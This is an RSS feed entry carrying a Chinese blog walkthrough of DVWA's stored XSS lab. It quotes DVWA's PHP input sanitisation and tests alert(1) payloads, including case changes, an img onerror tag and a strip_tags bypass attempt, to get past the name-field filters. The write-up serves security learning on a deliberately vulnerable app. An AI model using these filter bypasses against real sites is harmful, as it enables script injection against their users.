<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>xss on weakptr's 笔记</title><link>https://nnnewb.github.io/blog/tags/xss/</link><description>Recent content in xss on weakptr's 笔记</description><generator>Hugo -- gohugo.io</generator><language>zh-cn</language><lastBuildDate>Thu, 28 Apr 2022 17:21:00 +0800</lastBuildDate><atom:link href="https://nnnewb.github.io/blog/tags/xss/index.xml" rel="self" type="application/rss+xml"/><item><title>DVWA上手记录-存储型XSS</title><link>https://nnnewb.github.io/blog/p/get-start-dvwa-11/</link><pubDate>Thu, 28 Apr 2022 17:21:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/get-start-dvwa-11/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
&lt;p>还是很简单。&lt;/p>
&lt;h2 id="原理">原理&lt;/h2>
&lt;p>没过滤就保存到了数据库里，渲染的时候也没做好过滤。&lt;/p>
&lt;h2 id="解题">解题&lt;/h2>
&lt;h3 id="收集信息">收集信息&lt;/h3>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-11/image-20220428163441737.png"
width="678"
height="315"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-11/image-20220428163441737_hu3c302ff9bd851d0183412943be0aa03d_19867_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-11/image-20220428163441737_hu3c302ff9bd851d0183412943be0aa03d_19867_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220428163441737"
class="gallery-image"
data-flex-grow="215"
data-flex-basis="516px"
>&lt;/p>
&lt;p>留言板，而且试了下没过滤 &lt;code>&amp;lt;b&amp;gt;&lt;/code>，所以基本和反射型没什么区别，大概。&lt;/p>
&lt;h3 id="low难度">Low难度&lt;/h3>
&lt;p>直接插入一个&lt;code>&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&lt;/code>。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-11/image-20220428163539665.png"
width="860"
height="185"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-11/image-20220428163539665_hu82c12ffd210e1e55ee88d49785a7b96a_7170_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-11/image-20220428163539665_hu82c12ffd210e1e55ee88d49785a7b96a_7170_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220428163539665"
class="gallery-image"
data-flex-grow="464"
data-flex-basis="1115px"
>&lt;/p>
&lt;h3 id="medium难度">Medium难度&lt;/h3>
&lt;p>重置下数据库，再试试直接注入&lt;code>&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&lt;/code>。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-11/image-20220428163928089.png"
width="670"
height="313"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-11/image-20220428163928089_huc6de1d15d68806499a0138d5e708d6fa_19508_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-11/image-20220428163928089_huc6de1d15d68806499a0138d5e708d6fa_19508_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220428163928089"
class="gallery-image"
data-flex-grow="214"
data-flex-basis="513px"
>&lt;/p>
&lt;p>发现标签没了。看下源码。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="o">&amp;lt;?&lt;/span>&lt;span class="nx">php&lt;/span>
&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nx">isset&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$_POST&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;btnSign&amp;#39;&lt;/span> &lt;span class="p">]&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// Get input
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$message&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">trim&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$_POST&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;mtxMessage&amp;#39;&lt;/span> &lt;span class="p">]&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="nv">$name&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">trim&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$_POST&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;txtName&amp;#39;&lt;/span> &lt;span class="p">]&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="c1">// Sanitize message input
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$message&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">strip_tags&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nx">addslashes&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$message&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="nv">$message&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="nx">isset&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$GLOBALS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;___mysqli_ston&amp;#34;&lt;/span>&lt;span class="p">])&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="nx">is_object&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$GLOBALS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;___mysqli_ston&amp;#34;&lt;/span>&lt;span class="p">]))&lt;/span> &lt;span class="o">?&lt;/span> &lt;span class="nx">mysqli_real_escape_string&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$GLOBALS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;___mysqli_ston&amp;#34;&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="nv">$message&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="o">:&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="nx">trigger_error&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">E_USER_ERROR&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="o">?&lt;/span> &lt;span class="s2">&amp;#34;&amp;#34;&lt;/span> &lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">));&lt;/span>
&lt;span class="nv">$message&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">htmlspecialchars&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$message&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="c1">// Sanitize name input
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$name&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">str_replace&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="s1">&amp;#39;&amp;lt;script&amp;gt;&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nv">$name&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="nv">$name&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="nx">isset&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$GLOBALS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;___mysqli_ston&amp;#34;&lt;/span>&lt;span class="p">])&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="nx">is_object&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$GLOBALS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;___mysqli_ston&amp;#34;&lt;/span>&lt;span class="p">]))&lt;/span> &lt;span class="o">?&lt;/span> &lt;span class="nx">mysqli_real_escape_string&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$GLOBALS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;___mysqli_ston&amp;#34;&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="nv">$name&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="o">:&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="nx">trigger_error&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">E_USER_ERROR&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="o">?&lt;/span> &lt;span class="s2">&amp;#34;&amp;#34;&lt;/span> &lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">));&lt;/span>
&lt;span class="c1">// Update database
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$query&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;INSERT INTO guestbook ( comment, name ) VALUES ( &amp;#39;&lt;/span>&lt;span class="si">$message&lt;/span>&lt;span class="s2">&amp;#39;, &amp;#39;&lt;/span>&lt;span class="si">$name&lt;/span>&lt;span class="s2">&amp;#39; );&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nv">$result&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">mysqli_query&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$GLOBALS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;___mysqli_ston&amp;#34;&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="nv">$query&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="k">or&lt;/span> &lt;span class="k">die&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="s1">&amp;#39;&amp;lt;pre&amp;gt;&amp;#39;&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="nx">is_object&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$GLOBALS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;___mysqli_ston&amp;#34;&lt;/span>&lt;span class="p">]))&lt;/span> &lt;span class="o">?&lt;/span> &lt;span class="nx">mysqli_error&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$GLOBALS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;___mysqli_ston&amp;#34;&lt;/span>&lt;span class="p">])&lt;/span> &lt;span class="o">:&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="nv">$___mysqli_res&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">mysqli_connect_error&lt;/span>&lt;span class="p">())&lt;/span> &lt;span class="o">?&lt;/span> &lt;span class="nv">$___mysqli_res&lt;/span> &lt;span class="o">:&lt;/span> &lt;span class="k">false&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="s1">&amp;#39;&amp;lt;/pre&amp;gt;&amp;#39;&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="c1">//mysql_close();
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="p">}&lt;/span>
&lt;span class="cp">?&amp;gt;&lt;/span>&lt;span class="err">
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>注意&lt;code>sanitize message input&lt;/code>和&lt;code>sanitize name input&lt;/code>，使用了两种不同的方法替换掉&lt;code>script&lt;/code>标签。一个是&lt;code>strip_tags&lt;/code>一个是&lt;code>str_replace&lt;/code>。显然&lt;code>str_replace&lt;/code>是更弱的方法，我们先过掉&lt;code>str_replace&lt;/code>。payload 只需要改一下大小写：&lt;code>&amp;lt;sCript&amp;gt;alert(1)&amp;lt;/sCript&amp;gt;&lt;/code>。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-11/image-20220428164406647.png"
width="495"
height="162"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-11/image-20220428164406647_hu4eed0464b9fbe29bc03a94ed4f9d1725_6877_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-11/image-20220428164406647_hu4eed0464b9fbe29bc03a94ed4f9d1725_6877_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220428164406647"
class="gallery-image"
data-flex-grow="305"
data-flex-basis="733px"
>&lt;/p>
&lt;p>但是尴尬地发现这个 &lt;code>input&lt;/code> 标签限制了长度，直接改 HTML 解决。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-11/image-20220428164457027.png"
width="547"
height="193"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-11/image-20220428164457027_hudc35b59fc9ba85cf3558e5f8f3bb4e73_18210_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-11/image-20220428164457027_hudc35b59fc9ba85cf3558e5f8f3bb4e73_18210_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220428164457027"
class="gallery-image"
data-flex-grow="283"
data-flex-basis="680px"
>&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-11/image-20220428164501682.png"
width="796"
height="184"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-11/image-20220428164501682_hud5750180c75a01dae4b7900e31fb3984_6255_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-11/image-20220428164501682_hud5750180c75a01dae4b7900e31fb3984_6255_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220428164501682"
class="gallery-image"
data-flex-grow="432"
data-flex-basis="1038px"
>&lt;/p>
&lt;p>好的，成功过了一个。重置数据库后再尝试 bypass 掉 &lt;code>strip_tags&lt;/code>。&lt;/p>
&lt;p>函数文档提到：&lt;/p>
&lt;blockquote>
&lt;p>Self-closing XHTML tags are ignored and only non-self-closing tags should be used in &lt;code>allowed_tags&lt;/code>.&lt;/p>
&lt;/blockquote>
&lt;p>而且&lt;/p>
&lt;blockquote>
&lt;p>&lt;strong>Warning&lt;/strong>&lt;/p>
&lt;p>This function should not be used to try to prevent XSS attacks. Use more appropriate functions like &lt;a class="link" href="https://www.php.net/manual/en/function.htmlspecialchars.php" target="_blank" rel="noopener"
>htmlspecialchars()&lt;/a> or other means depending on the context of the output.&lt;/p>
&lt;/blockquote>
&lt;p>所以可以肯定 &lt;code>strip_tags&lt;/code> 是挡不住 XSS 的。文档提到会忽略 &lt;code>self-closing XHTML tags&lt;/code>，所以用 &lt;code>img&lt;/code> 标签试一下。payload改成：&lt;code>&amp;lt;img src=&amp;quot;&amp;quot; onerror=alert(1)/&amp;gt;&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-11/image-20220428164835457.png"
width="339"
height="51"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-11/image-20220428164835457_hu0ee66bc511c74093719e818fd3334056_1828_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-11/image-20220428164835457_hu0ee66bc511c74093719e818fd3334056_1828_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220428164835457"
class="gallery-image"
data-flex-grow="664"
data-flex-basis="1595px"
>&lt;/p>
&lt;p>失败。直接谷歌一下怎么 bypass &lt;code>strip_tags&lt;/code>。&lt;a class="link" href="https://stackoverflow.com/questions/5788527/is-strip-tags-vulnerable-to-scripting-attacks" target="_blank" rel="noopener"
>这个链接&lt;/a>解释了&lt;code>strip_tags&lt;/code>的实现为什么不能防御 XSS ，另一个回答提供了一个 payload：&lt;code>&amp;lt;&amp;lt;a&amp;gt;script&amp;gt;alert(XSS);&amp;lt;&amp;lt;/a&amp;gt;/script&amp;gt;&lt;/code>。直接试一试。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-11/image-20220428165138291.png"
width="361"
height="155"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-11/image-20220428165138291_hu7922ed0f8371cf771a421a018ff9de80_6277_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-11/image-20220428165138291_hu7922ed0f8371cf771a421a018ff9de80_6277_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220428165138291"
class="gallery-image"
data-flex-grow="232"
data-flex-basis="558px"
>&lt;/p>
&lt;p>好的，证明并不靠谱。注意到php代码里还做了&lt;code>addslashes&lt;/code>，保护比较好了，干脆放弃。继续做 High 难度。&lt;/p>
&lt;h3 id="high难度">High难度&lt;/h3>
&lt;p>看代码。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="o">&amp;lt;?&lt;/span>&lt;span class="nx">php&lt;/span>
&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nx">isset&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$_POST&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;btnSign&amp;#39;&lt;/span> &lt;span class="p">]&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// Get input
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$message&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">trim&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$_POST&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;mtxMessage&amp;#39;&lt;/span> &lt;span class="p">]&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="nv">$name&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">trim&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$_POST&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;txtName&amp;#39;&lt;/span> &lt;span class="p">]&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="c1">// Sanitize message input
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$message&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">strip_tags&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nx">addslashes&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$message&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="nv">$message&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="nx">isset&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$GLOBALS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;___mysqli_ston&amp;#34;&lt;/span>&lt;span class="p">])&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="nx">is_object&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$GLOBALS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;___mysqli_ston&amp;#34;&lt;/span>&lt;span class="p">]))&lt;/span> &lt;span class="o">?&lt;/span> &lt;span class="nx">mysqli_real_escape_string&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$GLOBALS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;___mysqli_ston&amp;#34;&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="nv">$message&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="o">:&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="nx">trigger_error&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">E_USER_ERROR&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="o">?&lt;/span> &lt;span class="s2">&amp;#34;&amp;#34;&lt;/span> &lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">));&lt;/span>
&lt;span class="nv">$message&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">htmlspecialchars&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$message&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="c1">// Sanitize name input
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$name&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">preg_replace&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="s1">&amp;#39;/&amp;lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nv">$name&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="nv">$name&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="nx">isset&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$GLOBALS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;___mysqli_ston&amp;#34;&lt;/span>&lt;span class="p">])&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="nx">is_object&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$GLOBALS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;___mysqli_ston&amp;#34;&lt;/span>&lt;span class="p">]))&lt;/span> &lt;span class="o">?&lt;/span> &lt;span class="nx">mysqli_real_escape_string&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$GLOBALS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;___mysqli_ston&amp;#34;&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="nv">$name&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="o">:&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="nx">trigger_error&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">E_USER_ERROR&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="o">?&lt;/span> &lt;span class="s2">&amp;#34;&amp;#34;&lt;/span> &lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">));&lt;/span>
&lt;span class="c1">// Update database
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$query&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;INSERT INTO guestbook ( comment, name ) VALUES ( &amp;#39;&lt;/span>&lt;span class="si">$message&lt;/span>&lt;span class="s2">&amp;#39;, &amp;#39;&lt;/span>&lt;span class="si">$name&lt;/span>&lt;span class="s2">&amp;#39; );&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nv">$result&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">mysqli_query&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$GLOBALS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;___mysqli_ston&amp;#34;&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="nv">$query&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="k">or&lt;/span> &lt;span class="k">die&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="s1">&amp;#39;&amp;lt;pre&amp;gt;&amp;#39;&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="nx">is_object&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$GLOBALS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;___mysqli_ston&amp;#34;&lt;/span>&lt;span class="p">]))&lt;/span> &lt;span class="o">?&lt;/span> &lt;span class="nx">mysqli_error&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$GLOBALS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;___mysqli_ston&amp;#34;&lt;/span>&lt;span class="p">])&lt;/span> &lt;span class="o">:&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="nv">$___mysqli_res&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">mysqli_connect_error&lt;/span>&lt;span class="p">())&lt;/span> &lt;span class="o">?&lt;/span> &lt;span class="nv">$___mysqli_res&lt;/span> &lt;span class="o">:&lt;/span> &lt;span class="k">false&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="s1">&amp;#39;&amp;lt;/pre&amp;gt;&amp;#39;&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="c1">//mysql_close();
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="p">}&lt;/span>
&lt;span class="cp">?&amp;gt;&lt;/span>&lt;span class="err">
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>老样子，直接用&lt;code>img&lt;/code>的payload就可以过，不多写了。&lt;/p>
&lt;h3 id="strip_tags">strip_tags&lt;/h3>
&lt;p>现在回头研究下 &lt;code>strip_tags&lt;/code> 这个函数要怎么 bypass 。首先链接里的问题是11年前提出（大约是2011年）的，提问时的PHP版本是 5.3（见提问者给的链接），所以在 5.x 版本可能 &lt;code>strip_tags&lt;/code> 确实会被 &lt;code>&amp;lt;&amp;lt;a&amp;gt;script&amp;gt;alert(XSS);&amp;lt;&amp;lt;/a&amp;gt;/script&amp;gt;&lt;/code> 给绕过。但我的DVWA配的环境是 PHP 7 + MySQL 5.7，所以这个问答里给出的 payload 可能是 PHP 7 已经修复了故而没用。&lt;/p>
&lt;p>从 Teh playground 测试的结果看新实现可能是栈方式了，就是&lt;code>&amp;lt;&lt;/code>计数+1，后面的全都删掉。因为&lt;code>&amp;lt;&lt;/code>一定被x，最多只能留下&lt;code>&amp;gt;&lt;/code>，想在 &lt;code>strip_tags&lt;/code> 里留下标签大概是做不到了。&lt;/p>
&lt;p>看下帮助手册，也是提到用&lt;code>name&lt;/code>字段而不是&lt;code>message&lt;/code>字段。现在是没辙了。&lt;/p>
&lt;h2 id="总结">总结&lt;/h2>
